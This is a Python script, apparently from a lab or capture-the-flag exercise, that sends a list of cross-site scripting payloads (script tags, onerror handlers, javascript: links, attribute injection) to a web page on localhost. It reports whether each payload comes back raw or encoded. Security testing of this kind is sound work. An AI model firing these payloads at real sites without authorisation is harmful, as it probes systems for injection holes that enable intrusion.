import http.client
import urllib.parse
import html

def test_xss_payloads():
    """Test XSS payload reflection contexts"""
    
    # Define payloads to test
    payloads = [
        ("plain_text", "Test123"),
        ("html_tag", "<b>BOLD</b>"),
        ("script_tag", "<script>alert(1)</script>"),
        ("event_handler", '<img src=x onerror=alert(1)>'),
        ("attribute_inj", '" onload=alert(1)>'),
        ("js_protocol", '<a href="javascript:alert(1)">click</a>'),
        ("special_chars", "<>\"'&"),
        ("mixed_xss", '<img src=x onError=alert("XSS")>')
    ]
    
    print("="*80)
    print("XSS CONTEXT ANALYSIS")
    print("Target: http://127.0.0.1:33081/page?name=PAYLOAD")
    print("="*80)
    
    results = []
    
    for test_name, payload in payloads:
        print(f"\n[TEST] {test_name.upper()}")
        print(f"Payload: {payload}")
        
        try:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload, safe='')
            
            # Create connection
            conn = http.client.HTTPConnection('127.0.0.1', 33081, timeout=15)
            
            # Make request
            conn.request('GET', f'/page?name={encoded_payload}')
            response = conn.getresponse()
            
            # Read response
            response_data = response.read().decode('utf-8', errors='ignore')
            conn.close()
            
            # Analyze reflection
            if payload in response_data:
                result = "REFLECTED (RAW)"
                # Find context
                idx = response_data.find(payload)
                context = response_data[max(0, idx-100):idx+len(payload)+50]
            elif html.escape(payload) in response_data:
                result = "REFLECTED (HTML ENCODED)"
                escaped = html.escape(payload)
                idx = response_data.find(escaped)
                context = response_data[max(0, idx-100):idx+len(escaped)+50]
            elif payload.replace('<', '&lt;').replace('>', '&gt;') in response_data:
                result = "REFLECTED (HTML ENCODED)"
                context = "HTML entities encoded"
            else:
                result = "BLOCKED/NOT REFLECTED"
                context = "Payload not found in response"
            
            print(f"Result: {result}")
            if context != "Payload not found in response":
                print(f"Context snippet:\n{context}")
            else:
                print(f"Response preview: {response_data[:300]}")
            
            results.append((test_name, payload, result, context))
            
        except Exception as e:
            print(f"ERROR: {str(e)}")
            results.append((test_name, payload, "ERROR", str(e)))
    
    # Summary
    print("\n" + "="*80)
    print("SUMMARY")
    print("="*80)
    
    for name, payload, result, ctx in results:
        print(f"{name:20s}: {result}")
    
    return results

if __name__ == "__main__":
    test_xss_payloads()
